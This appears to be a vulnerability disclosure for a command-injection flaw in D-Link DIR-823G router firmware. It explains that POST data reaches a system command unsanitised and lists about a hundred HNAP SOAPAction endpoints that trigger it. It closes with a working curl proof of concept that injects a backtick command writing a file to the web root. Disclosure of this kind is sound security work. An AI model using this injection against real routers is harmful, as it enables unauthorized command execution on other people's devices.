# DIR823G_V1.0.2B05_20181207.bin Command execution vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

The parameter a7 is the post request data, and a7 is spliced ​​into v11 as log data, and then v11 is executed as a system command.

![](img/2.jpg#center)

This vulnerability can be triggered when the SOAPAction is any of the following urls.
    http://purenetworks.com/HNAP1/SetMultipleActions
    http://purenetworks.com/HNAP1/CheckPasswdSettings
    http://purenetworks.com/HNAP1/FirmwareDownloadCancel
    http://purenetworks.com/HNAP1/GetAccessCtlList
    http://purenetworks.com/HNAP1/GetAccessCtlSwitch
    http://purenetworks.com/HNAP1/GetAdvNetworkSettings
    http://purenetworks.com/HNAP1/GetAPClientSettings
    http://purenetworks.com/HNAP1/GetAutoRebootSettings
    http://purenetworks.com/HNAP1/GetAutoUpgradeFirmware
    http://purenetworks.com/HNAP1/GetCAPTCHAsetting
    http://purenetworks.com/HNAP1/GetClientInfo
    http://purenetworks.com/HNAP1/GetCurrentInternetStatus
    http://purenetworks.com/HNAP1/GetDDNSSettings
    http://purenetworks.com/HNAP1/GetDeviceDomainName
    http://purenetworks.com/HNAP1/GetDeviceSettings
    http://purenetworks.com/HNAP1/GetDHCPClientInfo
    http://purenetworks.com/HNAP1/GetDMZSettings
    http://purenetworks.com/HNAP1/GetFactoryDefault
    http://purenetworks.com/HNAP1/GetFirewallSettings
    http://purenetworks.com/HNAP1/GetFirmwareStatus
    http://purenetworks.com/HNAP1/GetFirmwareValidation
    http://purenetworks.com/HNAP1/GetGuestNetworkSettings
    http://purenetworks.com/HNAP1/GetGuestWLanSettings
    http://purenetworks.com/HNAP1/GetGuestZoneRouterSettings
    http://purenetworks.com/HNAP1/GetInternetConnUpTime
    http://purenetworks.com/HNAP1/GetIPv4FirewallSettings
    http://purenetworks.com/HNAP1/GetLanWanConflictInfo
    http://purenetworks.com/HNAP1/GetLocalMacAddress
    http://purenetworks.com/HNAP1/GetMACFilters2
    http://purenetworks.com/HNAP1/GetMyDLinkSettings
    http://purenetworks.com/HNAP1/GetNetworkSettings
    http://purenetworks.com/HNAP1/GetNetworkTomographyResult
    http://purenetworks.com/HNAP1/GetNetworkTomographySettings
    http://purenetworks.com/HNAP1/GetNTPServerSettings
    http://purenetworks.com/HNAP1/GetOperationMode
    http://purenetworks.com/HNAP1/GetParentsControlInfo
    http://purenetworks.com/HNAP1/GetPPPoEServerStatus
    http://purenetworks.com/HNAP1/GetQoSManagementType
    http://purenetworks.com/HNAP1/GetQoSSettings
    http://purenetworks.com/HNAP1/GetRouterInformationSettings
    http://purenetworks.com/HNAP1/GetRouterLanSettings
    http://purenetworks.com/HNAP1/GetScheduleSettings
    http://purenetworks.com/HNAP1/GetSmartconnectSettings
    http://purenetworks.com/HNAP1/GetStaticClientInfo
    http://purenetworks.com/HNAP1/GetStaticRouteSettings
    http://purenetworks.com/HNAP1/GetSystemUpTime
    http://purenetworks.com/HNAP1/GetUplinkInterface
    http://purenetworks.com/HNAP1/GetUpnpSettings
    http://purenetworks.com/HNAP1/GetVirtualServerSettings
    http://purenetworks.com/HNAP1/GetWanConnectionType
    http://purenetworks.com/HNAP1/GetWanCurrentStatus
    http://purenetworks.com/HNAP1/GetWanplugInfo
    http://purenetworks.com/HNAP1/GetWanSettings
    http://purenetworks.com/HNAP1/GetWanSpeedTest
    http://purenetworks.com/HNAP1/GetWanStatus
    http://purenetworks.com/HNAP1/GetWifiDownSettings
    http://purenetworks.com/HNAP1/GetWLanRadioSecurity
    http://purenetworks.com/HNAP1/GetWLanRadioSettings
    http://purenetworks.com/HNAP1/GetWPSSettings
    http://purenetworks.com/HNAP1/Login
    http://purenetworks.com/HNAP1/PollingFirmwareDownload
    http://purenetworks.com/HNAP1/RunReboot
    http://purenetworks.com/HNAP1/SetAccessCtlList
    http://purenetworks.com/HNAP1/SetAccessCtlSwitch
    http://purenetworks.com/HNAP1/SetAdvNetworkSettings
    http://purenetworks.com/HNAP1/SetAPClientSettings
    http://purenetworks.com/HNAP1/SetAutoRebootSettings
    http://purenetworks.com/HNAP1/SetAutoUpgradeFirmware
    http://purenetworks.com/HNAP1/SetClientInfo
    http://purenetworks.com/HNAP1/SetDDNSSettings
    http://purenetworks.com/HNAP1/SetDeviceSettings
    http://purenetworks.com/HNAP1/SetDMZSettings
    http://purenetworks.com/HNAP1/SetFactoryDefault
    http://purenetworks.com/HNAP1/SetFirewallSettings
    http://purenetworks.com/HNAP1/SetGuestWLanSettings
    http://purenetworks.com/HNAP1/SetIgnoreWizardConfig
    http://purenetworks.com/HNAP1/SetIPv4FirewallSettings
    http://purenetworks.com/HNAP1/SetLanWanConflictInfo
    http://purenetworks.com/HNAP1/SetNetworkSettings
    http://purenetworks.com/HNAP1/SetNetworkTomographySettings
    http://purenetworks.com/HNAP1/SetNTPServerSettings
    http://purenetworks.com/HNAP1/SetParentsControlInfo
    http://purenetworks.com/HNAP1/SetPasswdSettings
    http://purenetworks.com/HNAP1/SetPPPoEServerSettings
    http://purenetworks.com/HNAP1/SetQoSManagementType
    http://purenetworks.com/HNAP1/SetQoSSettings
    http://purenetworks.com/HNAP1/SetRouterLanSettings
    http://purenetworks.com/HNAP1/SetSmartconnectSettings
    http://purenetworks.com/HNAP1/SetStaticClientInfo
    http://purenetworks.com/HNAP1/SetStaticRouteSettings
    http://purenetworks.com/HNAP1/SetTriggerADIC
    http://purenetworks.com/HNAP1/SetUpnpSettings
    http://purenetworks.com/HNAP1/SetVirtualServerSettings
    http://purenetworks.com/HNAP1/SetWanSettings
    http://purenetworks.com/HNAP1/SetWanSpeedTest
    http://purenetworks.com/HNAP1/SetWifiDownSettings
    http://purenetworks.com/HNAP1/SetWLanRadioSecurity
    http://purenetworks.com/HNAP1/SetWLanRadioSettings
    http://purenetworks.com/HNAP1/SetWPSSettings
    http://purenetworks.com/HNAP1/StartFirmwareDownload
    http://purenetworks.com/HNAP1/UpdateClientInfo

## Vulnerability verify

![](img/3.jpg#center)

![](img/4.jpg#center)

## POC

```
a='`echo hack>/web_mtn/hack.txt`' ; curl http://192.168.0.1/HNAP1 -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetPasswdSettings"' -d "'$a'" -s >/dev/null ; curl http://192.168.0.1/hack.txt -s
```
